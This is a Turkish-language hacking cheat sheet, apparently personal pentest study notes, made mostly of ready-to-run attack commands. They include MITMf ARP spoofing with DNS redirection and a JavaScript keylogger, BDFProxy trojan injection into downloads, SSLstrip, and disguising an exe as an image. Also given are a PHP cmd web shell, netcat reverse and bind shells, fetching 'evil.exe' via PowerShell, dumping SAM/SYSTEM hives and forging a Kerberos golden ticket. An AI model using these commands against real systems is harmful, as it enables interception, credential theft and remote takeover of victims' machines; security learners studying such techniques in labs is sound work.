VPN :
* Mozilla Firefox tarayıcıda Vpn kullanımı için web tarayıcı adres kısmına “about:config” gir.
“media.peerconnection.enable” -> false yap.  (Gerçek ip adresinin vpn kullanımında bazı yerlerde geçmesini engeller.)
Vpnbook ‘a gir. Openvpn sekmesinden indirilen vpn dosyasını “unzip” ile çıkar. “openvpn açılacakportadı.ovpn” (Yükleme yaparken tarayıcı pencereleri kapat)
* Opera tarayıcı içinde Vpn var.
*** www.dnsleaktest.com -> Hangi ülke ip’sinde olduğunu görme. Gerçek ip mizi bulunabilir mi test eder.
TOR Browser :
Kaliye Tor Kurma;
 “apt-get install tor -y”
“apt-get install proxychains”
leafpad /etc/proxychains.conf
	#dynamic_chain	//# işaretini sil
	#strict_chain		//# işareti ekle
	En alttaki socks4 -> socks5 yap. Kaydet
Tarayıcıda : proxy ayarları -> manuel ayarları seç. socks host : 127.0.0.1  port: 9050 gir
Tor ağını başlat	=>	“service tor start”
**Siteden girilen ip adresi değişti. Komut satırında ise hala eski ip mevcut. Onunda değişmesi için;
“proxychains curl icanhazip.com”	=> Yazacağın her komutun başına proxychains yaz, ip gizlenir.

MITM (Man in the Middle Framework):
Yüklemek için 	->	“apt-get install mitmf”
“mitmf --arp --spoof --gateway modem_ip --target hedef_ip -i eth0”
Güvenli Https isteklerini Http olarak açtırır. Hsts kullanan sitelerde çalışmaz. (Hsts: Adres satırına elle http girsen bile seni https sayfasına atar. Facebook ve gmail hsts kullanıyor)
MITM DNS
Sahte Dns adreslerine yönlendirme yapar.İstediğimiz ip adresine yönlendiririz.
“leafpad /etc/mitmfmitmf.conf” -> Açılan dosyada [[[A]]] yazan yer girilen sitenin yönlendirildiği ip nin yazıldığı yer. (*.hotmail.com = 192.168.1.1)
Yönlendirmeyi başlatma :
“mitmf --arp --spoof --gateway modem_ip --target hedef_ip -i eth0 --dns”

Ekran Görüntüsü Alma:
“mitmf --arp --spoof --gateway modem_ip --target hedef_ip -i eth0 --screen --interval 20” (20 saniye)
Görüntülerin kaydedildiği yer : /var/log/mitmf
Hata verirse : “pip install Twisted=15.5.0”
Klavye Tuşlarını Takip Etmek:
“mitmf --arp --spoof --gateway modem_ip --target hedef_ip -i eth0 --jskeylogger”
Java Script Kodlarını Çalıştırmak:
“mitmf --arp --spoof --gateway modem_ip --target hedef_ip -i eth0 --inject --js-payload “alert(‘...’);”

BDF (Backdoor Factory) Proxy:
Hedef birşey indirmek istediğinde biz trojanımızı o dosyanın içine yamalıyoruz. Bunun için;
1-	Aynı ağda olmak
2-	Man in the middle olmak
3-	BDF Proxy ayarlarını yapmak gerekir.

“leafpad /etc/bdfproxy/ bdfproxy.cfg”
1-	proxy mode = transparent
2-	Hedef işletim sistemi neyse ordaki host ip yerine kendi ip mizi yazıyoruz.
“ip tables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080”
(80’den gelen bağlantıyı 8080’e yönlendir)
“bdfproxy” yaz. Saldırıyı başlat.
MITM saldırısını başlat. Dinleme modu için;
“msfconsole -r /usr/share/bdfproxy/.... .rc (bdfproxy nin dinlediği dosya yolu)
SSL Strip Çalıştırma (Https’i Http’ye Çevirme)
“ip tables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000”

“sslstrip”
Ettercap çalıştırma:
“ettercap -Tq -M arp:remote -S -i wlan0 /192.168.1.1//  /192.168.1.15//”
// -S -> sslstrip kendimiz yaptığımız için S koymalıyız.
Virüslü Dosyayı Görsel Dosya İle Birleştirme:

Shellter
İki farklı dosyayı birleştirmeye yarar. POST EXPLOİTATİON (İSTİSMAR SONRASI) bölümünde var.
Fake Image Exploiter
Github’dan indir
1-	Setting dosyası ayarlarını değiştirme;
a.	Leafpad ile aç.
i.	picture extension : jpeg (resim formatını gir)
ii.	payload extension : exe (trojan formatını gir)
2-	“bash FakeImageExploiter.sh” -> Programı çalıştır.
3-	exe dosyayı göster -> jpeg dosyayı göster -> icon seç -> isim gir -> ip gir -> port gir -> metot gir
Daha inandırıcı olması için herhangi bir programla icon resmini değiştirebiliriz.
Uzantısını değiştirebiliriz;
Dosya adını kopyala, not defterine yaz. Karakter işlemden sağdan sola methodunu seç. Dosya adını yeniden oluştur.

SİTE ZAFİYETLERİ

Brute Force (Kaba Kuvvet) Saldırısı
Kullanıcı adı ve parola girilen yerlerde belli bir kısıtlama yoksa sürekli deneme yaparak (wordlist aracılığıyla) kullanıcı adı ve parolayı tespit etmeye yarar. Örnek program “Hydra”
Command Injection (Komut Enjeksiyonu)
Bir web uygulaması üzerinde uzaktan kod çalıştırabilme. Text yazılan kısma özel karakter (&&) girdikten sonra yazılan komutlar, komut satırında yazılıyormuş gibi davranır.
CSRF (Siteler Arası İstek Sahtekârlığı) Zafiyeti 
Giriş panellerinde oluşan açıktır. Girilen kullanıcı adı ve parola değiştirildiğinde adres satırında girilen değerler yazar. Adres satırından şifreler değişebilir.
File Inclusion Zafiyeti
Bulunduğu sistemdeki dosyaları okumaya yarayan araçtır. (etc/passwd dosyasını)
File Upload Zafiyeti
Siteye zararlı bir dosya upload ederek ele geçirmek. (Örnek siteye shell atılması)
php shell atma :  pentestmonkey sitesinden php reverse shell indir. ip ve port değiştir.
cmd shell örneği :   <?php system ($_GET[‘cmd’]);?>
Sql Injection Zafiyeti
“ ’ ” tırnak işareti konduğunda syntax hatası veriyorsa sql açığı olduğunu anlarız.
Sql Injection (Blind)
Sql Injection açığından farkı; açık olduğu web sitesine yansıtılmaz yani hata kodu görülmez.
XSS Reflected Zafiyeti
Yazı yazılabilen bir alanda bu zafiyet olabilir. Reflected zafiyetinde yazılan kodlar sadece bizi etkiler, siteye kaydedilmez.
XSS Stored Zafiyeti
Yapılan işler veri tabanına kaydedilir. Bütün giriş yapan kullanıcılar etkilenir. Html, javascript kodları çalışır.
PYTHON
Python dilinde kod yazma :	#!/usr/bin/env python
Türkçe karakter desteği :	# -*- coding: utf-8 -*-
base64 decoder :	for word in $(cat şifre.txt);do echo $word | base64 --decode >> çıktı.txt; done
Komut satırında çalışmak için :
import os  	 //Komut satırında çalışmak için os ekledik
os.system(“apt-get install figlet”)	//figlet büyük yazı yazdırma aracı
os.system(“clear”)
os.system(“figlet mac değiştirme”)
Ekrana yazı yazdırmak :	print(“””üç tırnak arasına ekranda görmek istediğini yaz”””)
Seçenekler arasından seçim yapmak :
islemno = raw_input (“İşlem no girin”)
if (islemno==”1”):
hedef ip =raw_input(“hedef ip girin:”)
os.system(”nmap” + hedef ip)
elif (islemno==”2”):
hedef ip =raw_input(“hedef ip girin:”)
os.system(”nmap -sS -sV” + hedef ip)
else: print(“hatalı seçim”)

CTRL + K + C	=	Toplu yorum satırına alma
CTRL + K + U	=	Toplu yorum satırını kaldırma

Scapy

ARP Poison
ARP Request paketi	=  scapy.ARP(op=1) (Default)
ARP Response paketi	=  
degisken = scapy.ARP(op=2,pdst=hedef ip, hwdst=hedef mac, psrc= modem ip gir)
scapy.send(degisken)  :  Paketi gönderir.
hwdst	= Hedef mac adresi
pdst	= Hedef ip adresi
psrc	= Kaynak ip adresi
hwsrc	= Kaynak mac adresi

Python Kodunu Exe Yapma

"C:\Users\TR\AppData\Local\Programs\Python\Python310\Scripts\pyinstaller.exe" MyPackage.py --onefile --add-data "C:\Users\TR\Desktop\adobe.pdf;." --noconsole --icon C:\Users\TR\Desktop\pdf.ico

BIND SHELL , REVERSE SHELL

BIND SHELL
Hedef üzerinde komut çalıştırılır. Gelen istekleri onaylayacak port açar. Biz hedefteki açılan porta istek göndeririz. Hedef isteği kabul eder.
Örnek;
Saldırgan makine	: nc -vvn hedef ip port
Hedef makine		:nc.exe -lvp port -e cmd.exe  //Önceden dosyanın o pc de olması gerekir
REVERSE SHELL
Hedef üzerinde komut çalıştırılır. Hedeften bize bağlantı isteği gelir. Biz dinleme modunda bekleriz ve gelen isteği kabul ederiz.
Örnek;
Saldırgan makine	: nc -lvp port
Hedef makine		:nc.exe -vvn saldırgan_ip port -e cmd.exe  //Bağlantıdan sonra cmd.exe çalışır.
***Düzgün bir shell almak için;
python -c ‘import pty;pty.spawn(“/bin/bash”)’

Uzaktan Bağlantı Kurmak (Windows)
winexe
winexe --user=Administrator%Parola ||hedef ip “cmd”    //Hedef komut satırına ulaşma
psexec

NETCAT
Sistemler arası iletişim kurmayı sağlar.
Netcat ile TCP port tarama:
nc -nvv -z 192.168.1.100 1-50  //port aralığını tarar.
Netcat ile shell alma:
1. Dinleme için	=>	nc -lvp 4444
2. Komut	=>	nc -e /bin/sh kendi ipmiz 4444
	
NETSTAT
Bilgisayarın gelen ve giden bağlantılarını, bu bağlantılara neden olan programları, pid numaralarını veren bir komuttur.
cmd =>  “netstat -anob”	daha detaylı =>  “netstat -anobf”
Kapatmak istediğin pid no varsa;
cmd => “taskkill /F /PID 2715”
Görev yöneticisinde çalışan programları komut satırında görmek için;
cmd =>	“tasklist”  yada  “tasklist /fi “PID EQ 2715”   //sadece o pıd numarasında çalışanı getirir
Hangi portların dinlendiğini görme;
cmd =>	“netstat -antp”
a:	all
t:	tcp bağlantıları getirir
u:	udp bağlantıları getirir
p:	pid hangi uygulamayı kullanıyor

STEGANOGRAFI
steghide
Resim içine veri saklama, içindeki veriyi okuma yada dışarı çıkarmaya yarar.
Veri saklamak için;
steghide --embed -ef (saklanacak veri) -cf (içine gömülecek dosya) -p (parola) -sf (oluşturulacak dosya adı) -e (şifreleme metodu) -z (sıkıştırma derecesi) -v (verbose)
Kontrol için;
steghide --info (kontrol edilecek dosya) -p (parola)
Veriyi açmak için;
steghide --extract -sf (şifrelenmiş dosya) -p (parola) -xf (oluşturulacak dosya adı)
Open Stego
Java destekli ortamlarda çalışır
Invisible Secret 4
Puffer 4.04
Xiao Steganography 2.61
S-Tools

Damgalama (Watermarking)
Bir dosyanın telif hakkını sağlayabilmek için o dosyanın içine gömme işlemine watermarking denir.
binwalk
Bir dosya içinde gömülü başka dosya olup olmadığını görürüz.

Hedef Sisteme Dosya Atma
wget
“wget dosya yolu url adresi”

scp
“scp dosya yolu  kullanıcı adı@hedef ip:/tmp/”
Örnek:	scp /var/www/html/evil.sh  msfadmin@192.168.1.10:/tmp/

netcat
Hedefte netcat yüklüyse;
“nc -lvp 4444 >evil.sh.2”	=> Hedefte dinlemeye aldık. Gelen dosyayı evil.sh.2 olarak kaydet.
kendi pc mizde;
“nc 192.168.1.12 4444 <evil.sh

powershell
1.	Apache servisi çalışıyor olacak
2.	İlgili dosya apache dizininde olacak
“powershell.exe (New-Object System.Net.WebClient).Download.File(‘http://ip_adresi/evil.exe’,’C:\Users\Default\evil.exe’)”

Bilgisayar Açıkken SAM ve SYSTEM Dosyalarını Elde Etmek

reg save hklm\SAM sam
reg save hklm\SYSTEM system

Load Balance Detector
Kali üzerinde “lbd” aracı ile hedefte yük dengeleyici olup olmadığını tespit ederiz. Özellikle Ddos saldırılarındaki yükü dengelemek için kullanılan bir güvenlik sistemidir.
“lbd site adı”

Mobil (Android) Güvenliği

Kullanılan araçlar = apktool , jadx (apk yada ipa uzantılı dosyaların içeriğindeki kodları okumaya yarar.
AndrodBugs = otomatik analizler gerçekleştirir, uygulamanın kullandığı güvenlik önlemlerini gösterir.
Sanal Android Uygulama = Android studio , Genymotion, Android x86 ( Fiziksel cihaz yerine sanal android oluşturma)
Taşınabilir Android Pentest Aracı = Appie (Windows)
Yapman gereken işlemler

1	Apk kurmadan önce nelere karşı önlem alınmış onları bilmek gerekir.
2	Normal kullanıcı gibi apk yı yükle ve nasıl çalıştığını anlamak için kurcala.
3	Uygulamanın yaptığı işlemleri izlemek için wireshake ve burp aracı ile network ve veri trafiği izlenebilir.
4	Depolama alanları ve uygulama loglarının incelenmesi


FTP 
 Wireshark ile FTP üzerinden aktarılan verinin dışarıya kayıt edilebilmesi için,
•	ftp-data filtresinden faydalanabilirsiniz.
•	RAW olarak kayıt etmeniz gerekmektedir.
Adb Shell ile telefona bağlantı yapılabilir.

OSINT
Web Sayfa Kaynak Kod Analizi
Arama terimi	Açıklama
<!--	Yorumlar
@	e-mail adresleri
ca-pub	Google Yayıncı Kimliği
ua-	Google AdSense Kimliği
.jpg	Ayrıca diğer resim dosyası uzantılarını deneyin


Veritabanı
Sqlite
Veritabanı dosyasına bağlanma =  Sqlite3 database_adı
Tablo bilgilerini görme		= PRAGMA table_info(tablo adı)
Verileri getirme			= SELECT * FROM tablo adı

GOLDEN TICKET
Kerberos golden ticket oluşturma
run post/Windows/escalate/golden_ticket 
“golden_ticket_create -h”
-d = domain tam adı
-g = grup yetki numaraları
-i = grup kullanıcı id si
-k = ntlm hashi kerberos
-s = domain sid değeri
-u = kullanıcı adı
-t = nereye kaydedileceği
Sid bulma = wmic useraccount get name, sid
Kerberos_ticket_use	/ ticket yolu
Kerberos_ticket_list
